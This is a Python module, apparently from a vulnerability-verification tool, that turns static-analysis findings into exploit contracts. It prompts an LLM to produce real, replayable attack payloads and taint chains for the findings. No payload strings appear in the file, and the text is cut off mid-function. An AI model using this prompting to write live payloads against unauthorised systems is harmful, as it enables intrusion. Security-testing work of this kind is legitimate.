"""
A2.1 exploit contract planning agent.
"""

from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import replace
import json
import logging
import os
import re
import time
from typing import Any, Dict, List, Optional, Tuple

from src.core.exploit_spec import empty_chain_proof, empty_exploit_spec, merge_exploit_specs, normalize_chain_proof, normalize_exploit_spec
from src.core.param_resolver import is_valid_param_name, normalize_payload_family
from src.core.code_retriever import retrieve_rag_context
from src.core.chain_builder import build_chain_from_index, format_chain_for_prompt, populate_entry_from_chain
from src.core.proof_obligations import evaluate_proof_obligations, has_auth_source_evidence, has_sql_injection_source_evidence, has_ssrf_source_evidence
from src.core.models import ScanResult, Vulnerability
from .a2_contracts import attach_contract_execution_metadata, derive_contract_gaps
from src.core import workspace_runtime
from src.core.path_norm import match_path_key

logger = logging.getLogger(__name__)

# 单份契约实测约 110 token（小样例 3.7s），真实契约约 1100 token。原 4096 上限会让旧模型
# 单条最长约 290s；现下调到 1024：足够覆盖真实契约输出，同时把最坏生成时间压到约 60s 内，
# 与 a2_ai_agent.LLM_READ_TIMEOUT（默认 60）匹配。可用 SASTAI_A2_PLANNER_MAX_TOKENS 覆盖。
PLANNER_MAX_TOKENS = int(os.environ.get("SASTAI_A2_PLANNER_MAX_TOKENS", "1024") or "1024")

# LLM 返回必须至少命中其中一个键，才认作「POC 契约 JSON」（见 _parse_llm_poc_json 的模式守卫）。
_POC_SCHEMA_KEYS = ("verdict", "payload", "success_signal", "poc_chain")


class A2ContractPlanner:
    """Enriches canonical findings into executable exploit contracts for D2.

    Q5：POC 生成必须使用 LLM。``llm_client`` 为 A2 语义分析共用的 LLM 客户端
    （与 A2SemanticAgent 同 provider）；传入时 POC / poc_chain 以 LLM 产出为主、
    规则式 _enrich_exploit_spec 仅作结构兜底（缺字段时补）。无客户端时回退纯规则式。
    """

    def __init__(self, llm_client: Optional[Any] = None):
        self.llm_client = llm_client

    def plan_scan_results(self, results: List[ScanResult], a1_evidence_index: Optional[Dict] = None, code_root: Optional[str] = None, code_index: Optional[Dict] = None, workspace_id: Optional[int] = None, on_progress: Optional[Any] = None) -> List[ScanResult]:
        # 黑板阶段二：A2 必读知识（family_alias），best-effort 非致命，仅日志化载入（不阻断规划）。
        try:
            from src.core.knowledge_entries import read_for_stage
            read_for_stage(workspace_id, "a2")
        except Exception:
            pass
        planned: List[ScanResult] = []
        by_file = (a1_evidence_index or {}).get("by_file", {}) or {}
        aggregate = (a1_evidence_index or {}).get("aggregate", {}) or {}
        # _plan_vulns_concurrent，其 total 是「单个 result（文件）内的漏洞数」，每处理完一个文件
        # done/total 就重置 → 前端读数在 3/3、1/2 之间跳变，与 stage_results 的全局 0/179 自相矛盾。
        _total_all = sum(len(getattr(r, "vulnerabilities", []) or []) for r in results)
        _done_all = 0

        def _global_on_progress(_done_in_file: int, _total_in_file: int) -> None:
            nonlocal _done_all
            _done_all += 1
            if on_progress is not None:
                try:
                    on_progress(_done_all, _total_all)
                except Exception:
                    pass

        _on_progress_global = _global_on_progress if on_progress is not None else None
        for result in results:
            vulns = list(getattr(result, "vulnerabilities", []) or [])
            if not vulns:
                planned.append(replace(result, vulnerabilities=[]))
                continue
            # 每个漏洞的 plan_vulnerability 仅读写各自 vuln 对象，llm_client 只读、
            # 每次调用独立 requests.post（无共享可变状态）→ 可安全并发，消除逐漏洞串行 LLM 瓶颈。
            # §路径归一修复：同 a2/service.scan_files —— by_file 的 key 是 A1 侧路径形态
            # （绝对路径），result.file 是 A2 侧（相对路径），直接 .get 恒 miss，
            # 导致 POC 规划阶段同样拿不到 per-file 的 A1 证据，只能吃 aggregate。
            evi = match_path_key(getattr(result, "file", "") or "", by_file, aggregate)
            planned_vulns = self._plan_vulns_concurrent(vulns, evi, code_root=code_root, code_index=code_index, on_progress=_on_progress_global)
            planned.append(replace(result, vulnerabilities=planned_vulns))
        return planned

    def _plan_vulns_concurrent(self, vulns: List[Vulnerability], a1_evidence: Optional[Dict], code_root: Optional[str] = None, code_index: Optional[Dict] = None, on_progress: Optional[Any] = None) -> List[Vulnerability]:
        """对单个 result 内的漏洞做并发 POC 规划。

        无 LLM 客户端时退化为串行（纯规则式，极快）；有 LLM 客户端时按
        SASTAI_A2_PLANNER_WORKERS（默认 6，上限 16）并发调用 plan_vulnerability。
        单条规划异常不致命：记日志并回退原始 vuln，避免一条坏数据卡死整批。
        """
        if not vulns:
            return []
        if self.llm_client is None:
            # 规则式（无 LLM）路径也要按条回调 on_progress，否则 a2_poc 进度在这条路径上完全不动。
            _out: List[Vulnerability] = []
            for _i, _v in enumerate(vulns):
                _out.append(self.plan_vulnerability(_v, a1_evidence, code_root=code_root, code_index=code_index))
                if on_progress is not None:
                    try:
                        on_progress(_i + 1, len(vulns))
                    except Exception:
                        pass
            return _out
        # 原默认 10 / 硬上限 16 偏保守。改为 env 可调：SASTAI_A2_PLANNER_WORKERS 默认 16、
        # SASTAI_A2_PLANNER_MAX_WORKERS 默认 32（受 Ollama NUM_PARALLEL 与 Windows 虚拟提交上限约束，
        # 实际并发由 Ollama 排队，超发不报错只排队）。**全族保留 PoC**——不跳过静态已确认族的 PoC。
        try:
            _default = int(os.environ.get("SASTAI_A2_PLANNER_WORKERS", "16"))
        except Exception:
            _default = 16
        try:
            _cap = int(os.environ.get("SASTAI_A2_PLANNER_MAX_WORKERS", "32"))
        except Exception:
            _cap = 32
        max_workers = max(1, min(_default, len(vulns), _cap))
        out: List[Optional[Vulnerability]] = [None] * len(vulns)
        _done = 0
        _total = len(vulns)
        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            future_to_idx = {
                ex.submit(self.plan_vulnerability, vuln, a1_evidence, code_root, code_index): idx
                for idx, vuln in enumerate(vulns)
            }
            for fut in as_completed(future_to_idx):
                idx = future_to_idx[fut]
                try:
                    out[idx] = fut.result()
                except Exception as _e:
                    logger.warning(
                        "[A2ContractPlanner] 漏洞 %s 规划异常，回退原始假说：%s",
                        getattr(vulns[idx], "type", ""), _e,
                    )
                    out[idx] = vulns[idx]
                # a2_poc 真实进度（本轮 33.9 分钟）。on_progress 默认 None，调用吞异常。
                _done += 1
                if on_progress is not None:
                    try:
                        on_progress(_done, _total)
                    except Exception:
                        pass
        return [v if v is not None else vulns[i] for i, v in enumerate(out)]

    def plan_vulnerability(self, vuln: Vulnerability, a1_evidence: Optional[Dict] = None, code_root: Optional[str] = None, code_index: Optional[Dict] = None) -> Vulnerability:
        # ① 入口族名提前归一，使后续 _enrich_exploit_spec / _fill_contract_routes 看到规范族名
        #    （spel/ognl/template-injection 合并；idor/bola/bfla 合并），避免同一漏洞多族分裂。
        _init_spec = normalize_exploit_spec(getattr(vuln, "exploit_spec", None) or empty_exploit_spec())
        _init_payload = _init_spec.setdefault("payload", {})
        if _init_payload.get("payload_family"):
            _init_payload["payload_family"] = normalize_payload_family(_init_payload["payload_family"])
        vuln.exploit_spec = _init_spec
        base_spec = normalize_exploit_spec(getattr(vuln, "exploit_spec", None) or empty_exploit_spec())
        vuln.chain_proof = normalize_chain_proof(getattr(vuln, "chain_proof", None) or empty_chain_proof())
        vuln.proof_gaps = list(vuln.chain_proof.get("proof_gaps", []) or [])
        vuln.chain_id = str(getattr(vuln, "chain_id", "") or getattr(vuln, "canonical_group_key", "") or "")
        # ===== S1/S3：确定性回溯拼链（code_index 调用图）+ 救援入口解析 =====
        # 从 code_index 调用图沿 callers 向上 BFS 回溯到 http_entry；回溯成功即证明该 sink 可由
        # 某个 HTTP 入口触发（图可达性，确定性强，不靠 LLM 猜）。命中后：
        #   - 置 proof_tier=chain_proven，使 _score_candidate 的 no_reachable_entry 闸门不再误杀；
        #   - 若静态入口解析（_pre_resolve_a2_endpoints）未解析出入口，用确定性链救援 entry_resolution，
        #     让 D1 拿到真实 route/method（即便参数名未知，也能打到入口而非 404）。
        # 回溯不到 http_entry 时保持 broad_static，不伪造链路。
        _chain = None
        if code_index is not None:
            _chain = build_chain_from_index(
                getattr(vuln, "file", None), getattr(vuln, "line", None), code_index
            )
        if _chain and _chain.get("reached_entry"):
            _res = getattr(vuln, "entry_resolution", None)
            if not isinstance(_res, dict) or not _res.get("resolvable"):
                _ep = populate_entry_from_chain(_chain)
                vuln.entry_resolution = {
                    "resolvable": True,
                    "route": _ep["route"],
                    "method": _ep["method"],
                    "param_name": (str(_res.get("param_name", "")) if isinstance(_res, dict) else ""),
                    "param_location": (str(_res.get("param_location", "query")) if isinstance(_res, dict) else "query"),
                    "param_name_source": "chain_builder",
                }
            # 静态解析曾把入口判为不可达（entry_resolved=False）时，确定性链给出反证，必须翻牌。
            if getattr(vuln, "entry_resolved", None) is False:
                vuln.entry_resolved = True
            vuln.has_call_chain = True
            vuln.has_http_entry = True
            vuln.proof_tier = "chain_proven"
            _cp = normalize_chain_proof(getattr(vuln, "chain_proof", None) or empty_chain_proof())
            _cp.update({
                "reachable": True,
                "attacker_control_proven": True,
                "gate_bypass_or_satisfaction_proven": True,
                "payload_shape_proven": True,
                "success_signal_anchor_proven": True,
                "proof_confidence": "high",
                "proof_gaps": [],
                "chain_paths": _chain.get("chain_detail"),
                "proven_by": "code_index_call_graph",
            })
            vuln.chain_proof = _cp
            vuln.proof_gaps = []
            logger.info(
                "[A2ContractPlanner] S1 确定性回溯命中入口 %s（sink=%s:%s），置 proof_tier=chain_proven",
                _chain.get("entry_http"), getattr(vuln, "file", ""), getattr(vuln, "line", ""),
            )
        enriched_spec = self._enrich_exploit_spec(vuln, base_spec)
        # Q5：POC 生成必须使用 LLM——以 LLM 产出为主，规则式 _enrich_exploit_spec 仅作结构兜底
        # （缺字段时由规则式补全），保证闭环反思重跑能收敛、不退化成纯模板猜测。
        if self.llm_client is not None:
            llm_spec = self._llm_generate_poc(vuln, enriched_spec, a1_evidence, code_root=code_root, code_index=code_index, chain=_chain)
            if llm_spec:
                enriched_spec = self._overlay_spec(enriched_spec, llm_spec)
                logger.info(
                    "[A2ContractPlanner] 漏洞 %s 采用 LLM 生成 POC（payload_family=%s, poc_chain=%d 节点, verdict=%s）",
                    getattr(vuln, "type", ""),
                    (llm_spec.get("payload") or {}).get("payload_family", ""),
                    len(llm_spec.get("poc_chain") or []),
                    (llm_spec.get("llm_verdict") or {}).get("is_exploitable", ""),
                )
        # ② 解析结果回填：把 plan_pocs 之前（_pre_resolve_a2_endpoints）静态解析出的
        #    route+param+method 作为 ground truth 写回 entry，LLM 即使返回 entry 也会被覆盖，
        #    杜绝「LLM 猜的 route 与真实入口不一致 → D1 重放 404」。
        _res = getattr(vuln, "entry_resolution", None)
        if _res and _res.get("resolvable"):
            _entry = enriched_spec.setdefault("entry", {})
            _entry["route"] = str(_res.get("route") or _entry.get("route") or "")
            _entry["method"] = str(_res.get("method") or _entry.get("method") or "GET").upper()
            _entry["parameter_name"] = str(_res.get("param_name") or _entry.get("parameter_name") or "")
            _entry["parameter_location"] = str(_res.get("param_location") or _entry.get("param_location") or "query")
            _entry["resolved_by"] = str(_res.get("param_name_source") or "source")
        enriched_spec = attach_contract_execution_metadata(enriched_spec)
        # LLM 产链时经常漏掉 ObjectInputStream 节点、或把 sink 写成业务方法名，
        # 导致 I1 逐节点比对无节点可匹配，链路判据形同虚设（该族 canary 通道又结构性失效，
        # 结果是「能报不能证」）。族命中且链缺失/不完整时，用确定性模板补齐。
        try:
            from src.iast.deserialization_chain import (
                canonical_poc_chain as _deser_chain,
                is_deserialization_family as _is_deser,
            )

            _fam = str(
                (enriched_spec.get("payload") or {}).get("payload_family")
                or getattr(vuln, "type", "")
                or ""
            )
            if _is_deser(_fam):
                _chain_now = enriched_spec.get("poc_chain") or []
                _has_deser_node = any(
                    "objectinputstream" in str(c.get("signature") or "").lower()
                    or "objectinputstream" in str(c.get("node") or "").lower()
                    for c in _chain_now
                    if isinstance(c, dict)
                )
                if not _chain_now or not _has_deser_node:
                    _entry = enriched_spec.get("entry") or {}
                    merged = _deser_chain(
                        endpoint=str(_entry.get("route") or ""),
                        param_name=str(_entry.get("parameter_name") or ""),
                        sink_signature=str(getattr(vuln, "sink", "") or ""),
                    )
                    if _chain_now:
                        # 保留 LLM 已有节点，只补缺失的反序列化/命令执行节点
                        _sigs = {str(c.get("signature") or "") for c in _chain_now if isinstance(c, dict)}
                        merged = list(_chain_now) + [
                            n for n in merged if n.get("signature") not in _sigs
                        ]
                    enriched_spec["poc_chain"] = merged
                    logger.info(
                        "[A2ContractPlanner] 反序列化族 poc_chain 兜底：%d 节点（原 %d 节点）",
                        len(merged), len(_chain_now),
                    )
        except Exception as _dc_e:  # 兜底绝不阻断主链路
            logger.warning("[A2ContractPlanner] 反序列化 poc_chain 兜底失败（忽略）：%s", _dc_e)
        # ③ 最终族名归一（LLM 可能回吐 spel/ognl/idor 等分裂名），保证 D2/TriggerSpec 去重一致。
        _payload = enriched_spec.setdefault("payload", {})
        if _payload.get("payload_family"):
            _payload["payload_family"] = normalize_payload_family(_payload["payload_family"])
        vuln.exploit_spec = enriched_spec
        if str(getattr(vuln, "proof_tier", "broad_static") or "broad_static") != "chain_proven":
            proof_tier, chain_proof = self._backfill_proof_tier(vuln, enriched_spec)
            vuln.proof_tier = proof_tier
            vuln.chain_proof = chain_proof
            vuln.proof_gaps = list(chain_proof.get("proof_gaps", []) or [])
        vuln.contract_gaps = derive_contract_gaps(vuln.proof_tier, enriched_spec)
        score, selected, reason = self._score_candidate(vuln, enriched_spec)
        vuln.a21_candidate_score = score
        vuln.a21_selected = selected
        vuln.a21_reason = reason
        return vuln

    # ------------------------------------------------------------------ Q5 LLM POC 生成 #
    def _llm_generate_poc(self, vuln: Vulnerability, base_spec: Dict, a1_evidence: Optional[Dict] = None, code_root: Optional[str] = None, code_index: Optional[Dict] = None, chain: Optional[Dict] = None) -> Optional[Dict]:
        """Q5：用 LLM 一次性产出「语义判定 + payload + poc_chain」。

        与用户选定的「姿势1 + 一次调用」一致：语义判定（verdict）与 payload 在同一上下文产出，
        避免两段 LLM 各说各话、route 与 payload 不一致。
        返回规范化的 exploit_spec 子集（覆盖 llm_verdict/payload/success_signal/poc_chain）。
        LLM 不可用时返回 None，由调用方回退规则式 _enrich_exploit_spec。
        """
        client = self.llm_client
        if client is None:
            return None
        try:
            vtype = str(getattr(vuln, "type", "") or getattr(vuln, "display_family", "") or "")
            code = str(getattr(vuln, "code_snippet", "") or getattr(vuln, "description", "") or "")
            entry_point = str(getattr(vuln, "entry_point", "") or "")
            callers = str(getattr(vuln, "callers", "") or "")
            # ③ 已静态解析出的 ground truth 入口（_pre_resolve_a2_endpoints 写入 vuln.entry_resolution）。
            #    LLM 必须消费该 route/method/param，不得改写——这是杜绝「重放 404」的关键。
            _res = getattr(vuln, "entry_resolution", None)
            if _res and _res.get("resolvable"):
                known_entry = (
                    f"route={_res.get('route')}  method={_res.get('method')}  "
                    f"parameter_name={_res.get('param_name')}  parameter_location={_res.get('param_location')}"
                )
            else:
                known_entry = "（静态分析未能解析出真实入口；若源码中可见，请据实推断，否则对应字段留空）"
            a1_block = ""
            if a1_evidence:
                a1_lines = []
                for key, label in (
                    ("entry_candidates", "HTTP 入口/路由"),
                    ("source_candidates", "攻击者可控源点"),
                    ("sink_candidates", "危险 sink"),
                    ("guard_candidates", "校验/拦截守卫"),
                    ("ownership_candidates", "鉴权/归属"),
                    ("business_logic_candidates", "A1 业务逻辑/越权假说"),
                    ("external_cve_hits", "已知 CVE 命中（nuclei）"),
                ):
                    for it in (a1_evidence.get(key) or [])[:6]:
                        if isinstance(it, dict):
                            summary = it.get("route") or it.get("name") or it.get("function") or it.get("signature") or ""
                            extra = it.get("method") or it.get("location") or ""
                            if not extra and isinstance(it.get("cve_ids"), list):
                                extra = ",".join(str(c) for c in it.get("cve_ids") if c)
                            a1_lines.append(f"- {label}: {summary} [{extra}]" if extra else f"- {label}: {summary}")
                        elif it:
                            a1_lines.append(f"- {label}: {it}")
                if a1_lines:
                    a1_block = "\nA1 静态分析调用链证据（交叉印证，以源码为准）：\n" + "\n".join(a1_lines) + "\n"
            # ④ S2：确定性调用链优先——把 code_index 回溯出的 [http_entry → … → sink] 作为 ground truth
            #    直接喂给 LLM，让 LLM 只在已知点上造 payload / 判可利用，而不是猜链路（确定性，不靠 LLM）。
            #    仅当确定性链为空（无 code_index 或回溯不到入口）时，才回退 RAG 零散窗口。
            if chain and chain.get("reached_entry"):
                rag_block = "\n" + format_chain_for_prompt(chain) + "\n"
            else:
                rag_block = ""
                try:
                    rag_ctx = retrieve_rag_context(vuln, code_root, code_index)
                    if rag_ctx:
                        rag_block = "\n相关代码上下文（RAG 检索，跨文件切片，供推断调用链与参数）：\n" + rag_ctx + "\n"
                except Exception as _rag_e:
                    logger.debug("[A2ContractPlanner] RAG 检索异常（忽略）：%s", _rag_e)
            prompt = (
                "你是资深应用安全漏洞利用工程师。下面是一条 SAST 静态分析产出的漏洞假说，"
                "请结合给出的源码片段与（可选）RAG 上下文，一次性产出「语义判定 + 利用载荷 + 污点链」，以 JSON 返回。\n"
                "已知真实入口（由源码注解 / 路由分析静态确定，权威，请勿改写 route 与 method）：\n"
                f"  {known_entry}\n\n"
                "JSON 字段（严格遵循）：\n"
                "{\n"
                '  "verdict": {"is_exploitable": true/false, "confidence": "high/medium/low", '
                '"rationale": "一句话利用可行性判断（结合已知入口与污点链）"},\n'
                '  "payload": {"payload_family": "如 command-execution/sql-injection/deserialization/ssrf/template-injection/xss/path-traversal/file-upload/xxe 等（族名必须取平台规范族清单：RMI/JNDI/LDAP/log4j 类证据一律归 jndi_injection，不得单独立 rmi 族；无鉴权/越权类入口归 broken_access_control，不得臆造协议族）", '
                '"candidate_payloads": ["可直接用于重放的具体可利用字符串"], "verification_payloads": ["验证用 payload"], '
                '"high_impact_payloads": ["高影响 payload"], "encoding": "base64 等（若需要）", "generator_hint": "生成建议"},\n'
                '  "success_signal": {"signal_type": "...", "match_strategy": "...", "expected_indicators": ["期望观测到的现象"]},\n'
                '  "poc_chain": [{"stage": "source|transform|sink", "role": "...", "node": "可读节点描述", "signature": "方法签名"}]\n'
                "}\n"
                "要求：只输出 JSON，不要解释；candidate_payloads 必须是可直接用于重放的具体可利用字符串"
                "（这是 LLM 真正擅长的部分，请给出真实可打的值，而非占位符）；"
                "poc_chain 是从已知入口到 sink 的有序污点传播节点；"
                "若 parameter_name 为空，请基于源码/@RequestParam/@PathVariable 推断真实参数名，不要编造类型签名；"
                "若确无利用价值，verdict.is_exploitable 置 false 并说明。\n\n"
                f"漏洞类型: {vtype}\n入口点: {entry_point}\n调用者: {callers}\n源码片段:\n{code}\n{a1_block}{rag_block}"
            )
            system = "You are a senior application-security exploit engineer. Output ONLY valid JSON matching the requested schema, no explanations."
            response = self._call_llm_with_retry(
                client, system, [{"role": "user", "content": prompt}], max_tokens=PLANNER_MAX_TOKENS, temperature=0.0
            )
            data = self._parse_llm_poc_json(response)
            if not data:
                return None
            return self._normalize_llm_poc(data, base_spec)
        except Exception as _e:  # LLM 失败必须降级，不能阻断整条流水线
            logger.warning("[A2ContractPlanner] LLM 生成 POC 失败，回退规则式：%s", _e)
            return None

    @staticmethod
    def _is_transient_llm_error(exc: Exception) -> bool:
        msg = str(exc).lower()
        return any(
            k in msg
            for k in ("429", "500", "502", "503", "504", "timeout", "timed out", "connection", "reset", "temporarily")
        )

    def _call_llm_with_retry(self, client, system, messages, max_tokens=PLANNER_MAX_TOKENS, temperature=0.0, retries=2):
        """对 client.create_message 做有限重试，吸收 429/5xx/超时等瞬时故障。

        重试仅针对瞬时错误（_is_transient_llm_error），其余错误立即上抛；
        重试用指数退避，且退避发生在单条 worker 线程内，不阻塞其他并发 vuln。
        耗尽重试后上抛，由 _llm_generate_poc 的兜底 except 转规则式回退。
        """
        last: Optional[Exception] = None
        backoff = 3.0
        for attempt in range(retries + 1):
            try:
                return client.create_message(system, messages, max_tokens=max_tokens, temperature=temperature)
            except Exception as _e:
                last = _e
                if self._is_transient_llm_error(_e) and attempt < retries:
                    logger.warning(
                        "[A2ContractPlanner] LLM 调用瞬时失败(尝试 %d/%d)，%ss 后重试：%s",
                        attempt + 1, retries + 1, backoff, _e,
                    )
                    time.sleep(backoff)
                    backoff *= 2.0
                    continue
                raise
        if last is not None:
            raise last
        return None

    @staticmethod
    def _parse_llm_poc_json(text: str) -> Optional[Dict]:
        if not text:
            return None
        # 数组抢救），替代原本的括号配平写法——原本不感知字符串内的括号，且截断即整段丢弃。
        # 这里期望拿到单个对象（一个 exploit_spec），故 expect="object"。
        try:
            from src.core.llm_output import parse_llm_json
        except Exception:
            from ..core.llm_output import parse_llm_json
        data, diag = parse_llm_json(text or "", expect="object")
        if not diag.ok or not isinstance(data, dict):
            logger.warning(
                "[LLM-OUTPUT] poc parse fail | strategy=%s truncated=%s repaired=%s error=%s | resp=%s",
                diag.strategy, diag.truncated, diag.repaired, diag.error, (text or "")[:200],
            )
            return None
        # 片段定位可能只框到内层子对象，
        # 那也是个合法 dict → 会被当成「LLM 生成的 POC」接受，但归一化后 payload 全空，
        # 上层却打日志说「采用 LLM 生成 POC」——LLM 产出被静默丢弃。
        # 故要求至少命中一个 POC schema 键，否则显式判失败、走规则式兜底并留证。
        if not any(k in data for k in _POC_SCHEMA_KEYS):
            logger.warning(
                "[LLM-OUTPUT] poc schema mismatch（未命中 POC schema 键，疑似片段定位框错）| keys=%s | resp=%s",
                sorted(data.keys()), (text or "")[:200],
            )
            return None
        return data

    @staticmethod
    def _normalize_llm_poc(data: Dict, base_spec: Dict) -> Dict:
        """把 LLM 返回的扁平 JSON 规范化为 exploit_spec 子集。"""
        spec = normalize_exploit_spec(base_spec)
        entry = spec.setdefault("entry", {})
        payload = spec.setdefault("payload", {})
        success = spec.setdefault("success_signal", {})
        e = data.get("entry") or {}
        if isinstance(e, dict):
            for k in ("route", "method", "parameter_name", "parameter_location", "content_type", "trigger_route"):
                if e.get(k):
                    entry[k] = str(e.get(k))
        p = data.get("payload") or {}
        if isinstance(p, dict):
            for k in ("payload_family", "encoding", "generator_hint"):
                if p.get(k):
                    payload[k] = str(p.get(k))
            for k in ("candidate_payloads", "verification_payloads", "high_impact_payloads"):
                v = p.get(k)
                if isinstance(v, list):
                    payload[k] = [str(x) for x in v if str(x)]
        s = data.get("success_signal") or {}
        if isinstance(s, dict):
            for k in ("signal_type", "match_strategy"):
                if s.get(k):
                    success[k] = str(s.get(k))
            if isinstance(s.get("expected_indicators"), list):
                success["expected_indicators"] = [str(x) for x in s["expected_indicators"] if str(x)]
        chain = data.get("poc_chain")
        if isinstance(chain, list):
            spec["poc_chain"] = [
                {
                    "stage": str(c.get("stage") or "node"),
                    "role": str(c.get("role") or c.get("stage") or "node"),
                    "node": str(c.get("node") or ""),
                    "signature": str(c.get("signature") or ""),
                }
                for c in chain
                if isinstance(c, dict) and (c.get("node") or c.get("signature"))
            ]
        # 单次 LLM 调用产出的语义判定（verdict）：与 payload/poc_chain 同上下文，供 _score_candidate
        # 作为软信号参考（硬门禁仍是「入口是否可静态解析」）。
        v = data.get("verdict")
        if isinstance(v, dict):
            spec["llm_verdict"] = {
                "is_exploitable": bool(v.get("is_exploitable", True)),
                "confidence": str(v.get("confidence") or "medium"),
                "rationale": str(v.get("rationale") or ""),
            }
        return spec

    @staticmethod
    def _overlay_spec(base: Dict, override: Dict) -> Dict:
        """LLM 覆盖规则式：override 中非空字段覆盖 base 对应字段（递归 dict，list 整体替换）。"""
        result = dict(base)
        for g, gv in (override or {}).items():
            if g == "version":
                continue
            if not isinstance(gv, dict):
                if gv not in (None, "", [], {}):
                    result[g] = gv
                continue
            base_g = result.get(g)
            if not isinstance(base_g, dict):
                result[g] = gv
                continue
            merged = dict(base_g)
            for k, v in gv.items():
                if isinstance(v, list):
                    if v:
                        merged[k] = v
                elif isinstance(v, dict):
                    if v:
                        merged[k] = v
                elif v not in (None, "", [], {}):
                    merged[k] = v
            result[g] = merged
        return result


    def _backfill_proof_tier(self, vuln: Vulnerability, exploit_spec: Dict) -> Tuple[str, Dict]:
        incoming_proof = normalize_chain_proof(getattr(vuln, "chain_proof", None) or empty_chain_proof())
        # proof_tier=chain_proven 会被 report_manager.is_mainline_d2_item 直接放进 D2 主链，
        # 与上面的 _score_candidate 硬闸配套，保证补行的 D2 语义只有「不验证」一种。
        if getattr(vuln, "is_absorbed", False):
            return str(getattr(vuln, "proof_tier", "broad_static") or "broad_static"), incoming_proof
        entry = exploit_spec.get("entry", {})
        payload = exploit_spec.get("payload", {})
        success_signal = exploit_spec.get("success_signal", {})
        chain_established, _ = self._has_established_static_evidence(vuln)
        chain_proof = evaluate_proof_obligations(
            vuln,
            exploit_spec,
            evidence=getattr(vuln, "a1_evidence", {}) or {},
            supporting_nodes=list(getattr(vuln, "supporting_nodes", []) or []),
            incoming_proof=incoming_proof,
        )
        proof_gaps = list(chain_proof.get("proof_gaps", []) or [])
        if not proof_gaps and self._proof_is_complete(incoming_proof):
            chain_proof["proof_confidence"] = incoming_proof.get("proof_confidence") or ("high" if chain_established else "medium")
            return "chain_proven", normalize_chain_proof(chain_proof)
        spec_complete = bool(
            entry.get("route")
            and entry.get("method")
            and payload.get("payload_family")
            and payload.get("payload_family") != "generic"
            and success_signal.get("signal_type")
        )
        structural_evidence = bool(
            getattr(vuln, "has_call_chain", False)
            or getattr(vuln, "callers", "")
            or getattr(vuln, "supporting_node_count", 0)
            or getattr(vuln, "supporting_nodes", [])
        )
        if (
            not proof_gaps
            and getattr(vuln, "is_canonical", False)
            and (chain_established or (spec_complete and structural_evidence))
        ):
            chain_proof["proof_confidence"] = "high" if chain_established else "medium"
            return "chain_proven", normalize_chain_proof(chain_proof)
        return str(getattr(vuln, "proof_tier", "broad_static") or "broad_static"), normalize_chain_proof(chain_proof)

    @staticmethod
    def _proof_is_complete(chain_proof: Dict) -> bool:
        proof = normalize_chain_proof(chain_proof or empty_chain_proof())
        return all(
            proof.get(key)
            for key in (
                "reachable",
                "attacker_control_proven",
                "gate_bypass_or_satisfaction_proven",
                "payload_shape_proven",
                "success_signal_anchor_proven",
            )
        )

    def _score_candidate(self, vuln: Vulnerability, exploit_spec: Dict) -> Tuple[int, bool, str]:
        proof_tier = str(getattr(vuln, "proof_tier", "broad_static") or "broad_static")
        # 它本身没有独立的可达入口证明 —— 其证据已并入所属聚合 finding。若放它进 D2，
        # 会与 canonical 争同一 canonical_group_key 的重放名额（d2_verification 按该键建
        # trigger_spec），既浪费墙钟时间又可能覆盖 canonical 的验证结论。故直接拦在门外。
        _absorbed_by = str(getattr(vuln, "absorbed_by_group_key", "") or "")
        if getattr(vuln, "is_absorbed", False):
            return 0, False, (
                "absorbed_member: 该节点已被聚合吸收（absorbed_by_group_key="
                f"{_absorbed_by or 'unknown'}），仅用于覆盖率统计与关联桥，不单独进入 D2 验证"
            )
        # 硬门禁：入口可解析性是 AP 正确性的前提。plan_pocs 之前（_pre_resolve_a2_endpoints）
        # 已对每漏洞做静态解析（源码注解/路由/entry_discovery）。解析不出 route+param 的漏洞标
        # entry_resolved=False（无可达入口），直接不进 a21_selected、不进 D2，省掉无效重放。
        if getattr(vuln, "entry_resolved", None) is False:
            return 0, False, "no_reachable_entry: 无可达入口（源码注解/路由/entry_discovery 均解析不出 route+param），不进入 D2 验证"
        # 旧逻辑把 proof_tier != chain_proven 直接判死刑，导致 A2 产出的 22 条里只有 2 条进入 D2。
        # 放宽为：chain_proven 直接放行；非 chain_proven 但若 exploit_spec 结构完整
        # （route/method/payload_family/success_signal 齐全）也允许 D2 去尝试验证，
        # 由 D2 的 trigger_spec 合法性校验和运行时结果过滤掉不可达的假说。
        entry = exploit_spec.get("entry", {})
        payload = exploit_spec.get("payload", {})
        success_signal = exploit_spec.get("success_signal", {})
        payload_family = str(payload.get("payload_family", "") or "")
        spec_complete = bool(
            entry.get("route")
            and entry.get("method")
            and payload_family
            and payload_family != "generic"
            and success_signal.get("signal_type")
        )
        structural_evidence = bool(
            getattr(vuln, "has_call_chain", False)
            or getattr(vuln, "callers", "")
            or getattr(vuln, "supporting_node_count", 0)
            or getattr(vuln, "supporting_nodes", [])
        )
        allow_candidate = (
            proof_tier == "chain_proven"
            or (spec_complete and structural_evidence)
        )
        if not allow_candidate:
            gaps = list(getattr(vuln, "proof_gaps", []) or [])
            return 0, False, "contract_blocked_by_proof_gap: " + ", ".join(gaps or ["proof_tier=broad_static"])

        score = 0
        reasons: List[str] = []
        entry = exploit_spec.get("entry", {})
        payload = exploit_spec.get("payload", {})
        prerequisites = exploit_spec.get("prerequisites", {})
        success_signal = exploit_spec.get("success_signal", {})
        payload_family = str(payload.get("payload_family", "") or "")
        parameter_name = str(entry.get("parameter_name", "") or "").lower()
        reachable = bool(
            getattr(vuln, "has_http_entry", False)
            or getattr(vuln, "has_call_chain", False)
            or getattr(vuln, "callers", "")
            or entry.get("route")
        )
        chain_established, chain_reason = self._has_established_static_evidence(vuln)
        execution_anchor = bool(entry.get("route") and entry.get("method"))
        observable_signal = bool(success_signal.get("signal_type"))

        if getattr(vuln, "is_canonical", False):
            score += 35
            reasons.append("canonical finding")
        if reachable:
            score += 25
            reasons.append("reachable exploit path")
        if getattr(vuln, "has_call_chain", False) or getattr(vuln, "supporting_node_count", 0):
            score += 15
            reasons.append("call chain or supporting nodes")
        if chain_established:
            score += 20
            reasons.append(chain_reason)
        if payload_family and payload_family != "generic":
            score += 15
            reasons.append(f"payload family={payload_family}")
        if execution_anchor:
            score += 5
            reasons.append("execution anchor")
        if entry.get("parameter_name") or entry.get("trigger_route"):
            score += 5
        if prerequisites.get("ordered_steps"):
            score += 10
            reasons.append("multi-step workflow")
        if observable_signal:
            score += 5

        severity = str(getattr(vuln, "severity", "") or "").upper()
        if severity == "HIGH":
            score += 10
        elif severity == "MEDIUM":
            score += 5

        if not execution_anchor:
            score -= 30
